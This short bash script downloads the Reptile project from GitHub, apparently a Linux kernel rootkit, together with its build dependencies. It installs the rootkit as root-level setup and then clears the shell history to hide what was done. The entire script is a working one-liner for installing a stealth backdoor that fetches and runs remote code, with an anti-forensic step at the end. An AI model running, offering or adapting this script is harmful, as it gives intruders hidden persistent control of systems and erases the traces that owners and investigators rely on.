#!/bin/bash
cd / && apt-get install linux-headers-$(uname -r) && perl -MCPAN -e "install String::Unescape" && wget https://github.com/f0rb1dd3n/Reptile/archive/master.zip && unzip master.zip && cd Reptile-master/ && ./setup.sh install && history -c 
